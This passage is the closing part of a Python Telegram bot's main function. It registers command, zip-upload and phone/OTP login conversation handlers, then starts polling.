        return

    await start_web_server()

    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', show_main_menu))
    application.add_handler(CommandHandler('admin', admin_command))
    application.add_handler(MessageHandler(filters.Document.FileExtension("zip"), handle_zip_upload))

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_login_process, pattern="^user_login$")],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, request_otp)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, verify_otp_and_check_name)],
            ASK_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_name_and_continue)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(core_callback, pattern="^admin_|^set_exp_|^main_menu$|^admin_panel$"))
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logging.info("System initialized successfully.")
    stop_signal = asyncio.Event()
    await stop_signal.wait()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
